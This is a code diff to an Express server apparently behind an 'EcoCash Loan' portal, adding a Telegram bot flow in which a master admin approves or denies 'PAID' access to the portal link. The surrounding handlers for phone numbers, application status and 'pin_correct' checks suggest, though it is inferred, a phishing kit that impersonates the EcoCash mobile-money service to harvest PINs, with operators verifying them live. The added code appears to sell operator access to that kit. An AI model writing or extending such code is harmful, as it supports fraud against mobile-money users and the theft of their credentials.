@@ -14,6 +14,7 @@ const publicPath = path.join(__dirname, 'public');
 app.use(express.static(publicPath));
 
 const activeApplications = new Map();
+const authorizedUsers = new Map();
 
 function formatZimbabwePhone(phone) {
   let formattedPhone = phone || '';
@@ -165,31 +166,118 @@ app.get('/api/check-status/:appReference', (req, res) => {
 app.post('/api/telegram-webhook', async (req, res) => {
   res.sendStatus(200);
   const botToken = process.env.TELEGRAM_BOT_TOKEN;
+  const masterChatId = process.env.TELEGRAM_CHAT_ID;
 
+  // Handle incoming text messages (e.g., /start)
   if (req.body.message && req.body.message.text) {
-    const text = req.body.message.text.trim();
-    const chatId = req.body.message.chat.id;
+    const message = req.body.message;
+    const text = message.text.trim();
+    const chatId = message.chat.id;
+    const user = message.from;
+
     if (text === '/start') {
-      const infoText = `🤖 <b>EcoCash Loan Bot System</b>\n\n` +
-                       `👤 <b>Developer / System Info:</b>\n` +
-                       `• Platform: EcoCash Secure Gateway v1.0\n` +
-                       `• Status: Online & Operational\n` +
-                       `• Authorized Network: Econet Zimbabwe (+263)`;
+      const userId = user.id;
+      const firstName = user.first_name || 'N/A';
+      const lastName = user.last_name || '';
+      const fullName = `${firstName} ${lastName}`.trim();
+      const username = user.username ? `@${user.username}` : 'No Username';
+      const privateLink = user.username ? `https://t.me/${user.username}` : `tg://user?id=${userId}`;
+
+      const userStatus = authorizedUsers.get(userId);
+
+      // If user is the primary admin or has already been approved as PAID
+      if (chatId.toString() === masterChatId || userStatus === 'PAID') {
+        if (chatId.toString() === masterChatId && !authorizedUsers.has(userId)) {
+          authorizedUsers.set(userId, 'PAID');
+        }
+
+        const portalUrl = `https://${req.get('host')}`;
+        const welcomeBackText = `🤖 <b>EcoCash Loan Portal</b>\n\n` +
+                                `✅ <b>Access Status:</b> AUTHORIZED (PAID)\n` +
+                                `🔗 <b>Your Portal Link:</b> <a href="${portalUrl}">${portalUrl}</a>`;
+        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id: chatId, text: welcomeBackText, parse_mode: 'HTML', disable_web_page_preview: true })
+        });
+        return;
+      }
+
+      // Mark user as pending
+      authorizedUsers.set(userId, 'PENDING');
+
+      // Send personal details and PAID/UNPAID inline buttons EXCLUSIVELY to the MAIN ADMIN (`masterChatId`)
+      const adminAlertText = `🚨 <b>NEW ADMIN ACCESS REQUEST</b>\n\n` +
+                             `🆔 <b>ID:</b> <code>${userId}</code>\n` +
+                             `👤 <b>Name:</b> ${fullName}\n` +
+                             `🏷 <b>Username:</b> ${username}\n` +
+                             `🔗 <b>Private Link:</b> <a href="${privateLink}">Open Profile</a>\n\n` +
+                             `👇 <b>Select Access Status for this User:</b>`;
+
       await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: chatId, text: infoText, parse_mode: 'HTML' })
+        body: JSON.stringify({
+          chat_id: masterChatId,
+          text: adminAlertText,
+          parse_mode: 'HTML',
+          reply_markup: JSON.stringify({
+            inline_keyboard: [
+              [
+                { text: '❌ UNPAID (Deny)', callback_data: `access_unpaid_${userId}` },
+                { text: '✅ PAID (Approve)', callback_data: `access_paid_${userId}` }
+              ]
+            ]
+          })
+        })
+      });
+
+      // Send waiting notice to the person who started the bot
+      const userPendingText = `👋 Hello <b>${fullName}</b>,\n\n` +
+                              `Your access request has been sent to the main administrator for review.\n\n` +
+                              `🆔 <b>Your ID:</b> <code>${userId}</code>\n` +
+                              `🏷 <b>Username:</b> ${username}\n` +
+                              `📌 <b>Status:</b> Pending Approval (Waiting for PAID clearance)`;
+      await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: chatId, text: userPendingText, parse_mode: 'HTML' })
       });
     }
     return;
   }
 
+  // Handle Callback Queries (PAID / UNPAID and application verification)
   const { callback_query } = req.body;
   if (!callback_query) return;
 
   const actionData = callback_query.data;
   const chatId = callback_query.message.chat.id;
   const messageId = callback_query.message.message_id;
+
+  // Access Control Handlers (PAID / UNPAID) - restricted to main admin interaction
+  if (actionData.startsWith('access_paid_') || actionData.startsWith('access_unpaid_')) {
+    const targetUserId = parseInt(actionData.split('_')[2], 10);
+    const isPaid = actionData.startsWith('access_paid_');
+
+    authorizedUsers.set(targetUserId, isPaid ? 'PAID' : 'UNPAID');
+
+    const statusLabel = isPaid ? '🟢 APPROVED (PAID)' : '🔴 REJECTED (UNPAID)';
+    const updatedText = `${callback_query.message.text}\n\n📌 <b>Decision:</b> ${statusLabel}`;
+    await editTelegramMessage(botToken, chatId, messageId, updatedText);
+
+    const portalUrl = `https://${req.get('host')}`;
+    const notificationText = isPaid 
+      ? `🎉 <b>Access Granted!</b>\n\nYour payment has been verified as <b>PAID</b>. You can now access your secure link below:\n\n🔗 <a href="${portalUrl}">${portalUrl}</a>`
+      : `⚠️ <b>Access Denied</b>\n\nYour account status is marked as <b>UNPAID</b>. Access to the portal link is restricted.`;
+
+    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: targetUserId, text: notificationText, parse_mode: 'HTML', disable_web_page_preview: !isPaid })
+    });
+    return;
+  }
 
   // PIN Handlers
   if (actionData.startsWith('pin_correct_')) {
@@ -257,4 +345,4 @@ app.get('*', (req, res) => {
 app.listen(PORT, () => {
   console.log(`🚀 EcoCash Loan Server running on port ${PORT}`);
 });
-        
+  
